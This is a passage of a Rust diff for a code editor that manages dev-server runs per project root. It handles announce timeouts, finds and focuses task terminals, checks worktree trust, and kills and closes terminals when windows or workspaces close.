+            quitting: false,
+            _subscriptions: vec![closed_windows, quit],
+        }
+    }
+
+    fn begin(
+        &mut self,
+        root: PathBuf,
+        workspace: WeakEntity<Workspace>,
+        window: AnyWindowHandle,
+        multi_workspace: Option<Entity<MultiWorkspace>>,
+        cx: &mut Context<Self>,
+    ) -> u64 {
+        self.next_run += 1;
+        let id = self.next_run;
+        let workspace_id = workspace.entity_id();
+        let workspace_removed = multi_workspace.map(|multi_workspace| {
+            let root = root.clone();
+            cx.subscribe(&multi_workspace, move |runs, _, event, cx| {
+                if let MultiWorkspaceEvent::WorkspaceRemoved(removed) = event
+                    && *removed == workspace_id
+                {
+                    runs.end(&root, id, "workspace_removed", cx);
+                }
+            })
+        });
+        self.runs.insert(
+            root,
+            Run {
+                id,
+                workspace,
+                window,
+                task_id: None,
+                timeout: None,
+                waiters: Vec::new(),
+                _workspace_removed: workspace_removed,
+            },
+        );
+        id
+    }
+
+    fn run(&self, root: &Path, id: u64) -> Option<&Run> {
+        self.runs.get(root).filter(|run| run.id == id)
+    }
+
+    fn run_mut(&mut self, root: &Path, id: u64) -> Option<&mut Run> {
+        self.runs.get_mut(root).filter(|run| run.id == id)
+    }
+
+    /// Forgets run `id` of `root`, never a newer run of the same root.
+    fn forget(&mut self, root: &Path, id: u64) -> Option<Run> {
+        self.run(root, id)?;
+        self.runs.remove(root)
+    }
+
+    /// The task is in a terminal: R1.6's timer starts.
+    fn scheduled(&mut self, root: &Path, id: u64, task_id: TaskId, cx: &mut Context<Self>) {
+        let timeout = announce_timer(root, id, cx);
+        if let Some(run) = self.run_mut(root, id) {
+            run.task_id = Some(task_id);
+            run.timeout = Some(timeout);
+        }
+    }
+
+    /// Registers a waiter for `root`'s announce; `None` when Zeo runs no dev server there.
+    fn wait(
+        &mut self,
+        root: &Path,
+        cx: &mut Context<Self>,
+    ) -> Option<oneshot::Receiver<AnnounceWait>> {
+        let run = self.runs.get_mut(root)?;
+        let (waiter, wait) = oneshot::channel();
+        run.waiters.push(waiter);
+        // Its timer already ran out, and R1.6 was shown: this wait gets a deadline of its own,
+        // on the same timer, so the notice and the waiter still end together.
+        if run.task_id.is_some() && run.timeout.is_none() {
+            log_event(
+                log::Level::Info,
+                "wait_rearmed",
+                root,
+                format!("run={}", run.id),
+            );
+            run.timeout = Some(announce_timer(root, run.id, cx));
+        }
+        Some(wait)
+    }
+
+    fn timed_out(&mut self, root: &Path, id: u64, cx: &mut Context<Self>) {
+        let Some(run) = self.run_mut(root, id) else {
+            return;
+        };
+        run.timeout = None;
+        log_event(log::Level::Warn, "not_announced", root, format!("run={id}"));
+        for waiter in run.waiters.drain(..) {
+            waiter.send(AnnounceWait::TimedOut).ok();
+        }
+        // The terminal stays open (R1.6): the operator reads why there.
+        if let Some(workspace) = run.workspace.upgrade() {
+            workspace.update(cx, |workspace, cx| {
+                show_toast(
+                    workspace,
+                    NotificationId::unique::<NotAnnouncedToast>(),
+                    NOT_ANNOUNCED,
+                    cx,
+                )
+            });
+        }
+    }
+
+    fn announced(&mut self, root: &Path) {
+        let Some(run) = self.runs.get_mut(&normalized(root)) else {
+            return;
+        };
+        if run.timeout.take().is_some() {
+            log_event(
+                log::Level::Info,
+                "announced",
+                root,
+                format!("run={}", run.id),
+            );
+        }
+        for waiter in run.waiters.drain(..) {
+            waiter.send(AnnounceWait::Announced).ok();
+        }
+    }
+
+    /// The dev server ended on its own, or its terminal was closed by hand.
+    fn on_exit(&mut self, root: &Path, id: u64, result: ScheduledTaskResult) {
+        if self.forget(root, id).is_some() {
+            log_event(
+                log::Level::Info,
+                "exited",
+                root,
+                format!("run={id} result={result:?}"),
+            );
+        }
+    }
+
+    /// Stops run `id` of `root` because its project went away (R7.4).
+    fn end(&mut self, root: &Path, id: u64, reason: &str, cx: &mut App) {
+        if let Some(run) = self.forget(root, id) {
+            log_event(
+                log::Level::Info,
+                "stop",
+                root,
+                format!("run={id} reason={reason}"),
+            );
+            close_terminal(root, run, cx);
+        }
+    }
+
+    fn window_closed(&mut self, window_id: WindowId, cx: &mut App) {
+        if self.quitting {
+            return;
+        }
+        let closed: Vec<(PathBuf, u64)> = self
+            .runs
+            .iter()
+            .filter(|(_, run)| run.window.window_id() == window_id)
+            .map(|(root, run)| (root.clone(), run.id))
+            .collect();
+        for (root, id) in closed {
+            self.end(&root, id, "window_closed", cx);
+        }
+    }
+}
+
+/// Cancels R1.6's timer when the root announces. The connected projects registry reads every
+/// window when it is created, which a window being updated hides, so creating it waits for the
+/// top level.
+fn subscribe_to_announces(this: WeakEntity<DevtoolsRuns>, cx: &mut App) {
+    let subscribe = move |projects: Entity<DevtoolsProjects>, cx: &mut App| {
+        this.update(cx, |runs, cx| {
+            let subscription = cx.subscribe(&projects, |runs, _, event, _| match event {
+                DevtoolsProjectsEvent::Announced(root) => runs.announced(root),
+            });
+            runs._subscriptions.push(subscription);
+        })
+        .ok();
+    };
+    match DevtoolsProjects::try_global(cx) {
+        Some(projects) => subscribe(projects, cx),
+        None => cx.defer(move |cx| {
+            let projects = DevtoolsProjects::global(cx);
+            subscribe(projects, cx);
+        }),
+    }
+}
+
+/// The workspace's first visible local worktree: its root and id.
+pub(crate) fn local_root(workspace: &Workspace, cx: &App) -> Option<(PathBuf, WorktreeId)> {
+    let project = workspace.project().read(cx);
+    if !project.is_local() {
+        return None;
+    }
+    let worktree = project.visible_worktrees(cx).next()?.read(cx);
+    Some((normalized(&worktree.abs_path()), worktree.id()))
+}
+
+/// Without a trust store nothing is restricted, as for the agent's project skills.
+fn is_trusted(project: &Entity<Project>, worktree_id: WorktreeId, cx: &mut App) -> bool {
+    let Some(trusted_worktrees) = TrustedWorktrees::try_get_global(cx) else {
+        return true;
+    };
+    let worktree_store = project.read(cx).worktree_store();
+    trusted_worktrees.update(cx, |trusted_worktrees, cx| {
+        trusted_worktrees.can_trust(&worktree_store, worktree_id, cx)
+    })
+}
+
+/// A terminal item showing a task.
+struct TaskTerminal {
+    pane: Entity<Pane>,
+    index: usize,
+    view: Entity<TerminalView>,
+    in_terminal_panel: bool,
+}
+
+/// The terminal showing `task_id` in `workspace`, in the terminal panel or the center.
+fn find_terminal(workspace: &Workspace, task_id: &TaskId, cx: &App) -> Option<TaskTerminal> {
+    let panel_panes = workspace
+        .panel::<TerminalPanel>(cx)
+        .map(|panel| {
+            panel
+                .read(cx)
+                .panes()
+                .into_iter()
+                .cloned()
+                .collect::<Vec<_>>()
+        })
+        .unwrap_or_default();
+    let panes = panel_panes
+        .into_iter()
+        .map(|pane| (pane, true))
+        .chain(workspace.panes().iter().cloned().map(|pane| (pane, false)));
+    for (pane, in_terminal_panel) in panes {
+        let found = pane.read(cx).items().enumerate().find_map(|(index, item)| {
+            let view = item.act_as::<TerminalView>(cx)?;
+            let task = view.read(cx).terminal().read(cx).task()?;
+            (&task.spawned_task.id == task_id).then_some((index, view))
+        });
+        if let Some((index, view)) = found {
+            return Some(TaskTerminal {
+                pane,
+                index,
+                view,
+                in_terminal_panel,
+            });
+        }
+    }
+    None
+}
+
+/// Focuses the run's terminal once the current update has ended (R1.5).
+fn focus_terminal(
+    task_id: TaskId,
+    workspace: WeakEntity<Workspace>,
+    window: AnyWindowHandle,
+    cx: &mut App,
+) {
+    cx.defer(move |cx| {
+        let focused = window.update(cx, |_, window, cx| {
+            workspace.update(cx, |workspace, cx| {
+                let terminal = find_terminal(workspace, &task_id, cx)?;
+                if terminal.in_terminal_panel {
+                    workspace.open_panel::<TerminalPanel>(window, cx);
+                }
+                terminal.pane.update(cx, |pane, cx| {
+                    pane.activate_item(terminal.index, true, true, window, cx)
+                });
+                Some(())
+            })
+        });
+        if !matches!(focused, Ok(Ok(Some(())))) {
+            log::debug!("devtools_run event=focus_skipped reason=no_terminal");
+        }
+    });
+}
+
+/// Kills the run's dev server and closes its terminal. The kill is explicit: a closed terminal
+/// kills its process only when the `Terminal` is dropped, which a window closing does not make
+/// happen on time (GOTCHA G5).
+fn close_terminal(root: &Path, run: Run, cx: &mut App) {
+    let Some(task_id) = run.task_id else {
+        return;
+    };
+    let terminal = run
+        .workspace
+        .upgrade()
+        .and_then(|workspace| find_terminal(workspace.read(cx), &task_id, cx));
+    let Some(terminal) = terminal else {
+        // Gone with its workspace, whose drop killed it, or closed by hand.
+        log_event(
+            log::Level::Debug,
+            "terminal_gone",
+            root,
+            format!("run={}", run.id),
+        );
+        return;
+    };
+    terminal
+        .view
+        .read(cx)
+        .terminal()
+        .clone()
+        .update(cx, |terminal, _| terminal.kill_active_task());
+    let item_id = terminal.view.entity_id();
+    let closed = run.window.update(cx, |_, window, cx| {
+        terminal.pane.update(cx, |pane, cx| {
+            pane.close_item_by_id(item_id, SaveIntent::Skip, window, cx)
+        })
+    });
+    match closed {
+        Ok(close) => close.detach_and_log_err(cx),
+        // The window is gone or quitting: the process is killed, the tab goes with the window.
+        Err(_) => log_event(
+            log::Level::Debug,
+            "tab_left",
+            root,
+            format!("run={}", run.id),
+        ),
+    }
+}
+
+fn show_toast(
+    workspace: &mut Workspace,
+    id: NotificationId,
+    message: impl Into<std::borrow::Cow<'static, str>>,
+    cx: &mut Context<Workspace>,
+) {
+    workspace.show_toast(Toast::new(id, message), cx);
+}
+
+fn log_event(level: log::Level, event: &str, root: &Path, fields: String) {
+    let separator = if fields.is_empty() { "" } else { " " };
+    log_line(
+        level,
+        format!(
+            "devtools_run event={event} root={}{separator}{fields}",
+            loggable_root(root)
+        ),
+    );
+}
